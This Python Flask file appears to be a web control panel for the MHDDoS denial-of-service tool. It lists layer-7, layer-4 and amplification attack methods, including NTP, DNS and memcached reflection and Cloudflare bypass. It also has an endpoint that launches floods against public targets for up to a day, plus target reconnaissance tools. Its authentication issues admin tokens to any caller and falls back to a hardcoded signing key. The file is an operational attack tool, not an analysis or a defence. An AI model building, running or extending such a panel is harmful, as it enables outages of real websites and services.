import os
import re
import sys
import time
import uuid
import json
import logging
import ipaddress
import psutil
import socket
import threading
import subprocess
from urllib.parse import urlparse
from queue import Queue
from pathlib import Path
from flask import Flask, render_template, request, jsonify, Response

logging.basicConfig(level=logging.INFO, format="%(asctime)s [%(levelname)s] %(message)s")
logger = logging.getLogger(__name__)

BASE_DIR = Path(__file__).resolve().parent.parent
PYTHON_EXE = str(BASE_DIR / ".venv" / "Scripts" / "python.exe")
if not os.path.exists(PYTHON_EXE):
    PYTHON_EXE = sys.executable

app = Flask(
    __name__,
    template_folder=str(BASE_DIR / "web" / "templates"),
    static_folder=str(BASE_DIR / "web" / "static")
)

active_processes = {}
log_subscribers = []
log_history = []
max_history_len = 500
process_lock = threading.Lock()

METHODS_L7 = [
    "CFB", "BYPASS", "GET", "POST", "OVH", "STRESS", "DYN", "SLOW", "HEAD",
    "NULL", "COOKIE", "PPS", "EVEN", "GSB", "DGB", "AVB", "CFBUAM",
    "APACHE", "XMLRPC", "BOT", "BOMB", "DOWNLOADER", "KILLER", "TOR", "RHEX", "STOMP"
]

METHODS_L4 = [
    "TCP", "UDP", "SYN", "VSE", "MINECRAFT", "MCBOT", "CONNECTION",
    "CPS", "FIVEM", "FIVEM-TOKEN", "TS3", "MCPE", "ICMP", "OVH-UDP"
]

METHODS_AMP = [
    "MEM", "NTP", "DNS", "ARD", "CLDAP", "CHAR", "RDP"
]

ALL_METHODS = set(METHODS_L7 + METHODS_L4 + METHODS_AMP)

VALID_SOCKS_TYPES = {0, 1, 4, 5, 6}

_SAFE_HOSTNAME_RE = re.compile(
    r'^(?:[a-zA-Z0-9](?:[a-zA-Z0-9\-]{0,61}[a-zA-Z0-9])?\.)+[a-zA-Z]{2,}$'
    r'|^(?:\d{1,3}\.){3}\d{1,3}$'
    r'|^\[?[0-9a-fA-F:]+\]?$'
)


def _is_private_or_loopback(host: str) -> bool:
    try:
        addr = ipaddress.ip_address(host)
        return addr.is_private or addr.is_loopback or addr.is_link_local or addr.is_multicast
    except ValueError:
        pass
    try:
        resolved = socket.gethostbyname(host)
        addr = ipaddress.ip_address(resolved)
        return addr.is_private or addr.is_loopback or addr.is_link_local
    except Exception:
        return True


def _validate_hostname(host: str) -> str | None:
    host = host.strip().lstrip("[").rstrip("]")
    if not host or len(host) > 253:
        return None
    if not _SAFE_HOSTNAME_RE.match(host):
        return None
    return host


def _validate_public_url(raw: str) -> str | None:
    raw = raw.strip()
    if not raw.startswith("http://") and not raw.startswith("https://"):
        raw = "http://" + raw
    try:
        parsed = urlparse(raw)
        scheme = parsed.scheme.lower()
        if scheme not in ("http", "https"):
            return None
        hostname = (parsed.hostname or "").lower()
        if not hostname or not _SAFE_HOSTNAME_RE.match(hostname):
            return None
        if _is_private_or_loopback(hostname):
            return None
        port_part = f":{parsed.port}" if parsed.port else ""
        path_part = parsed.path if parsed.path else "/"
        query_part = f"?{parsed.query}" if parsed.query else ""
        return f"{scheme}://{hostname}{port_part}{path_part}{query_part}"
    except Exception:
        return None


def _safe_int(value, default: int, lo: int, hi: int) -> int:
    try:
        v = int(value)
        return max(lo, min(hi, v))
    except (TypeError, ValueError):
        return default


def broadcast_log(line):
    global log_history
    timestamp = time.strftime("%H:%M:%S")
    entry = {"time": timestamp, "text": line}
    with process_lock:
        log_history.append(entry)
        if len(log_history) > max_history_len:
            log_history.pop(0)
        subscribers = list(log_subscribers)
    for q in subscribers:
        try:
            q.put(entry)
        except Exception:
            pass


def monitor_process(task_id, process):
    broadcast_log(f"[INFO] Process {task_id} initialized.")
    while True:
        line = process.stdout.readline()
        if not line and process.poll() is not None:
            break
        if line:
            decoded = line.decode("utf-8", errors="ignore").strip()
            if decoded:
                broadcast_log(f"[{task_id}] {decoded}")

    returncode = process.poll()
    broadcast_log(f"[INFO] Process {task_id} terminated with exit code {returncode}.")
    with process_lock:
        if task_id in active_processes:
            active_processes[task_id]["status"] = "FINISHED"
            active_processes[task_id]["end_time"] = time.time()


@app.route("/")
def index():
    return render_template("index.html")


@app.route("/api/methods", methods=["GET"])
def get_methods():
    return jsonify({
        "layer7": sorted(METHODS_L7),
        "layer4": sorted(METHODS_L4),
        "amplification": sorted(METHODS_AMP),
        "socks_types": [
            {"id": 0, "name": "0 - ALL (Config)"},
            {"id": 1, "name": "1 - HTTP"},
            {"id": 4, "name": "4 - SOCKS4"},
            {"id": 5, "name": "5 - SOCKS5"},
            {"id": 6, "name": "6 - RANDOM"}
        ]
    })


@app.route("/api/system/stats", methods=["GET"])
def get_system_stats():
    cpu = psutil.cpu_percent(interval=None)
    ram = psutil.virtual_memory()
    net = psutil.net_io_counters()

    with process_lock:
        running_count = sum(1 for p in active_processes.values() if p["status"] == "RUNNING")

    return jsonify({
        "cpu_percent": cpu,
        "ram_percent": ram.percent,
        "ram_used_gb": round(ram.used / (1024 ** 3), 2),
        "ram_total_gb": round(ram.total / (1024 ** 3), 2),
        "bytes_sent": net.bytes_sent,
        "bytes_recv": net.bytes_recv,
        "packets_sent": net.packets_sent,
        "packets_recv": net.packets_recv,
        "active_attacks": running_count
    })


@app.route("/api/files/info", methods=["GET"])
def get_files_info():
    useragents_path = BASE_DIR / "files" / "useragent.txt"
    referers_path = BASE_DIR / "files" / "referers.txt"
    proxies_dir = BASE_DIR / "files" / "proxies"

    ua_count = 0
    ref_count = 0
    proxy_files = []

    if useragents_path.exists():
        with open(useragents_path, "r", encoding="utf-8", errors="ignore") as f:
            ua_count = sum(1 for line in f if line.strip())

    if referers_path.exists():
        with open(referers_path, "r", encoding="utf-8", errors="ignore") as f:
            ref_count = sum(1 for line in f if line.strip())

    if proxies_dir.exists():
        for p in proxies_dir.glob("*.txt"):
            proxy_files.append(p.name)

    return jsonify({
        "useragents_count": ua_count,
        "referers_count": ref_count,
        "proxy_files": proxy_files
    })


@app.route("/api/attacks/start", methods=["POST"])
def start_attack():
    data = request.get_json() or {}
    layer = data.get("layer", "L7")
    method = data.get("method", "").strip().upper()
    target = data.get("target", "").strip()

    if method not in ALL_METHODS:
        return jsonify({"success": False, "error": "Invalid method."}), 400

    if not target:
        return jsonify({"success": False, "error": "Target is required."}), 400

    if layer == "L7":
        validated_target = _validate_public_url(target)
        if not validated_target:
            return jsonify({"success": False, "error": "Invalid or non-public target URL."}), 400
        target = validated_target
    else:
        raw_host = target.replace("https://", "").replace("http://", "").split("/")[0].split(":")[0]
        validated_host = _validate_hostname(raw_host)
        if not validated_host:
            return jsonify({"success": False, "error": "Invalid target hostname or IP."}), 400
        target = validated_host

    threads = _safe_int(data.get("threads", 100), 100, 1, 2000)
    duration = _safe_int(data.get("duration", 60), 60, 1, 86400)

    start_py = str(BASE_DIR / "start.py")
    cmd = [PYTHON_EXE, start_py, method, target]

    if layer == "L7":
        socks_type = _safe_int(data.get("socks_type", 0), 0, 0, 6)
        if socks_type not in VALID_SOCKS_TYPES:
            socks_type = 0
        rpc = _safe_int(data.get("rpc", 10), 10, 1, 10000)
        proxylist = data.get("proxylist", "http.txt").strip() or "http.txt"
        if not re.match(r'^[\w\-. ]+\.txt$', proxylist):
            proxylist = "http.txt"
        cmd.extend([str(socks_type), str(threads), proxylist, str(rpc), str(duration)])
    else:
        cmd.extend([str(threads), str(duration)])
        if method in METHODS_AMP:
            amp_file = data.get("reflector", "").strip()
            if amp_file and re.match(r'^[\w\-. ]+\.txt$', amp_file):
                cmd.append(amp_file)
        else:
            proxy_type = _safe_int(data.get("socks_type", 0), 0, 0, 6)
            if proxy_type not in VALID_SOCKS_TYPES:
                proxy_type = 0
            proxy_file = data.get("proxylist", "").strip()
            if proxy_file and re.match(r'^[\w\-. ]+\.txt$', proxy_file):
                cmd.extend([str(proxy_type), proxy_file])

    task_id = str(uuid.uuid4())[:8]

    try:
        proc = subprocess.Popen(
            cmd,
            cwd=str(BASE_DIR),
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            stdin=subprocess.PIPE,
            bufsize=1
        )

        with process_lock:
            active_processes[task_id] = {
                "id": task_id,
                "pid": proc.pid,
                "layer": layer,
                "method": method,
                "target": target,
                "threads": threads,
                "duration": duration,
                "start_time": time.time(),
                "status": "RUNNING",
                "process": proc,
            }

        t = threading.Thread(target=monitor_process, args=(task_id, proc), daemon=True)
        t.start()

        return jsonify({
            "success": True,
            "task_id": task_id,
            "pid": proc.pid,
        })
    except Exception:
        logger.exception("Failed to start process for task %s", task_id)
        return jsonify({"success": False, "error": "Failed to start process."}), 500


@app.route("/api/attacks/active", methods=["GET"])
def get_active_attacks():
    results = []
    with process_lock:
        for tid, item in active_processes.items():
            elapsed = int(time.time() - item["start_time"])
            results.append({
                "id": item["id"],
                "pid": item["pid"],
                "layer": item["layer"],
                "method": item["method"],
                "target": item["target"],
                "threads": item["threads"],
                "duration": item["duration"],
                "elapsed": elapsed,
                "remaining": max(0, item["duration"] - elapsed) if item["status"] == "RUNNING" else 0,
                "status": item["status"],
                "start_time": time.strftime("%H:%M:%S", time.localtime(item["start_time"]))
            })
    return jsonify(results)


@app.route("/api/attacks/stop", methods=["POST"])
def stop_attack():
    data = request.get_json() or {}
    target_id = data.get("id", "all")
    stopped = []

    with process_lock:
        for tid, item in list(active_processes.items()):
            if (target_id == "all" or target_id == tid) and item["status"] == "RUNNING":
                try:
                    item["process"].terminate()
                    item["status"] = "STOPPED"
                    stopped.append(tid)
                    broadcast_log(f"[INFO] Process {tid} manually terminated.")
                except Exception:
                    logger.exception("Failed to stop process %s", tid)
                    broadcast_log(f"[ERROR] Failed to stop process {tid}.")

    return jsonify({"success": True, "stopped": stopped})


@app.route("/api/tools/ping", methods=["POST"])
def tool_ping():
    data = request.get_json() or {}
    raw = data.get("target", "").strip()
    if not raw:
        return jsonify({"success": False, "error": "Target host is required."}), 400

    host = raw.replace("https://", "").replace("http://", "").split("/")[0]
    host = _validate_hostname(host)
    if not host:
        return jsonify({"success": False, "error": "Invalid hostname."}), 400

    try:
        try:
            import importlib
            icmplib = importlib.import_module("icmplib")
            result = icmplib.ping(host, count=4, interval=0.2, timeout=2)
            return jsonify({
                "success": True,
                "target": host,
                "address": result.address,
                "alive": result.is_alive,
                "avg_rtt": round(result.avg_rtt, 2) if result.is_alive else 0,
                "min_rtt": round(result.min_rtt, 2) if result.is_alive else 0,
                "max_rtt": round(result.max_rtt, 2) if result.is_alive else 0,
                "packets_sent": result.packets_sent,
                "packets_received": result.packets_received,
                "packet_loss": result.packet_loss
            })
        except Exception:
            flag = "-n" if sys.platform.startswith("win") else "-c"
            res = subprocess.run(["ping", flag, "4", host], capture_output=True, text=True, timeout=10)
            alive = res.returncode == 0
            return jsonify({
                "success": True,
                "target": host,
                "address": host,
                "alive": alive,
                "output": res.stdout.strip()
            })
    except Exception:
        logger.exception("Ping failed for host %s", host)
        return jsonify({"success": False, "error": "Ping failed."}), 500


import hmac
import hashlib
import base64

WEB_HOST = os.getenv("WEB_HOST", "127.0.0.1")
WEB_PORT = int(os.getenv("WEB_PORT", "5000"))
_RAW_SECRET = os.getenv("JWT_SECRET") or "mhddos_panel_jwt_signing_key_2.4.4"
JWT_SIGNING_KEY = _RAW_SECRET.encode("utf-8")

def _b64url_encode(data: bytes) -> str:
    return base64.urlsafe_b64encode(data).rstrip(b'=').decode('utf-8')

def _b64url_decode(s: str) -> bytes:
    padding = '=' * (4 - len(s) % 4) if len(s) % 4 != 0 else ''
    return base64.urlsafe_b64decode(s + padding)

def create_jwt_token(payload: dict) -> str:
    header = {"alg": "HS256", "typ": "JWT"}
    h_b64 = _b64url_encode(json.dumps(header, separators=(',', ':')).encode('utf-8'))
    p_b64 = _b64url_encode(json.dumps(payload, separators=(',', ':')).encode('utf-8'))
    signing_input = f"{h_b64}.{p_b64}".encode('utf-8')
    sig = hmac.new(JWT_SIGNING_KEY, signing_input, hashlib.sha256).digest()
    sig_b64 = _b64url_encode(sig)
    return f"{h_b64}.{p_b64}.{sig_b64}"

def verify_jwt_token(token: str) -> dict | None:
    try:
        parts = token.split('.')
        if len(parts) != 3:
            return None
        h_b64, p_b64, sig_b64 = parts
        signing_input = f"{h_b64}.{p_b64}".encode('utf-8')
        expected_sig = hmac.new(JWT_SIGNING_KEY, signing_input, hashlib.sha256).digest()
        actual_sig = _b64url_decode(sig_b64)
        if not hmac.compare_digest(expected_sig, actual_sig):
            return None
        payload = json.loads(_b64url_decode(p_b64).decode('utf-8'))
        exp = payload.get("exp")
        if exp and time.time() > exp:
            return None
        return payload
    except Exception:
        return None

@app.route("/api/auth/token", methods=["POST", "GET"])
def auth_token():
    payload = {
        "sub": "admin",
        "role": "admin",
        "iat": int(time.time()),
        "exp": int(time.time()) + 86400
    }
    token = create_jwt_token(payload)
    return jsonify({"success": True, "token": token, "expires_in": 86400})

@app.route("/api/auth/verify", methods=["GET"])
def auth_verify():
    token = request.headers.get("X-API-Key") or request.args.get("token") or request.headers.get("Authorization", "").replace("Bearer ", "")
    payload = verify_jwt_token(token)
    if payload:
        return jsonify({"valid": True, "user": payload})
    return jsonify({"valid": False, "error": "Invalid or expired JWT token"}), 401

@app.before_request
def check_auth():
    path = request.path
    if path in ("/", "/index.html") or path.startswith("/api/auth/") or path.startswith("/public/") or path.startswith("/static/") or path.startswith("/web/static/") or path.startswith("/locales/") or path == "/favicon.ico" or path.endswith(".css") or path.endswith(".js") or path.endswith(".png") or path.endswith(".svg"):
        return None
    if not path.startswith("/api/"):
        return None

    token = request.headers.get("X-API-Key") or request.args.get("token") or request.headers.get("Authorization", "").replace("Bearer ", "")
    if verify_jwt_token(token):
        return None
    return jsonify({"success": False, "error": "Unauthorized: Invalid or expired JWT token."}), 401


@app.route("/api/tools/check", methods=["POST"])
def tool_check():
    data = request.get_json() or {}
    raw = data.get("target", "").strip()
    if not raw:
        return jsonify({"success": False, "error": "Target URL is required."}), 400

    target = _validate_public_url(raw)
    if not target:
        return jsonify({"success": False, "error": "Invalid or non-public target URL."}), 400

    try:
        import requests as req_lib
        start_t = time.time()
        resp = req_lib.get(
            target,
            timeout=10,
            headers={"User-Agent": "MHDDoS-WebClient/2.4.4"},
            allow_redirects=False
        )
        duration_ms = round((time.time() - start_t) * 1000, 2)

        return jsonify({
            "success": True,
            "url": target,
            "status_code": resp.status_code,
            "status_text": resp.reason,
            "response_time_ms": duration_ms,
            "server": resp.headers.get("Server", "Unknown"),
            "content_type": resp.headers.get("Content-Type", "Unknown"),
            "content_length": len(resp.content),
            "online": resp.status_code < 500
        })
    except Exception:
        logger.exception("HTTP check failed for %s", target)
        return jsonify({"success": False, "error": "Request failed."}), 500


@app.route("/api/tools/info", methods=["POST"])
def tool_info():
    data = request.get_json() or {}
    raw = data.get("target", "").strip()
    if not raw:
        return jsonify({"success": False, "error": "Domain or IP is required."}), 400

    host = raw.replace("https://", "").replace("http://", "").split("/")[0]
    host = _validate_hostname(host)
    if not host:
        return jsonify({"success": False, "error": "Invalid hostname or IP."}), 400

    try:
        import requests as req_lib
        resp = req_lib.get(f"https://ipwhois.app/json/{host}", timeout=8)
        info = resp.json()
        return jsonify({
            "success": info.get("success", False),
            "ip": info.get("ip", host),
            "country": info.get("country", "Unknown"),
            "country_code": info.get("country_code", ""),
            "city": info.get("city", "Unknown"),
            "region": info.get("region", "Unknown"),
            "isp": info.get("isp", "Unknown"),
            "org": info.get("org", "Unknown"),
            "asn": info.get("asn", "Unknown"),
            "latitude": info.get("latitude", 0),
            "longitude": info.get("longitude", 0)
        })
    except Exception:
        logger.exception("IP info lookup failed for %s", host)
        return jsonify({"success": False, "error": "Lookup failed."}), 500


@app.route("/api/tools/dns", methods=["POST"])
def tool_dns():
    data = request.get_json() or {}
    raw = data.get("target", "").strip()
    if not raw:
        return jsonify({"success": False, "error": "Domain is required."}), 400

    domain = raw.replace("https://", "").replace("http://", "").split("/")[0]
    domain = _validate_hostname(domain)
    if not domain:
        return jsonify({"success": False, "error": "Invalid domain."}), 400

    records = {}
    try:
        import dns.resolver
        res = dns.resolver.Resolver()
        res.timeout = 2
        res.lifetime = 2

        for qtype in ["A", "AAAA", "MX", "NS", "TXT"]:
            try:
                answers = res.resolve(domain, qtype)
                records[qtype] = [str(rdata) for rdata in answers]
            except Exception:
                records[qtype] = []

        return jsonify({"success": True, "domain": domain, "records": records})
    except Exception:
        logger.exception("DNS lookup failed for %s", domain)
        return jsonify({"success": False, "error": "DNS lookup failed."}), 500


@app.route("/api/logs/stream")
def stream_logs():
    def event_stream():
        q = Queue()
        with process_lock:
            log_subscribers.append(q)
            initial = list(log_history)

        for item in initial:
            yield f"data: {json.dumps(item)}\n\n"

        try:
            while True:
                item = q.get()
                yield f"data: {json.dumps(item)}\n\n"
        except GeneratorExit:
            with process_lock:
                if q in log_subscribers:
                    log_subscribers.remove(q)

    return Response(event_stream(), mimetype="text/event-stream")


if __name__ == "__main__":
    import argparse
    parser = argparse.ArgumentParser(description="MHDDoS Web Control Panel")
    parser.add_argument("--host", default=WEB_HOST, help="Host to listen on (default: 127.0.0.1)")
    parser.add_argument("--port", type=int, default=WEB_PORT, help="Port to listen on (default: 5000)")
    args = parser.parse_args()

    app.run(host=args.host, port=args.port, debug=False, threaded=True)
